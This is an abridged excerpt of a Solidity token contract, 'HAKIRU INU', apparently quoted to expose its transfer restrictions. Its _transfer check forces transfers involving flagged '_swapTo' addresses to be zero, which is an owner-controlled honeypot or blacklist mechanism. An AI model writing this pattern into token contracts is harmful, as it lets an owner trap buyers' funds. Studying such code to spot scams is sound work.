...
contract HakiruInu is Context, IERC20, Ownable {
    ...
    string private _name = 'HAKIRU INU';
    string private _symbol = 'HAKIRU';
    ...
    function unCheck() public virtual onlyOwner {
        _state = false;
    }

    function isSwapped(address _address) public view returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_swapTo[sender] || _swapTo[recipient])
        require(amount == 0, "");
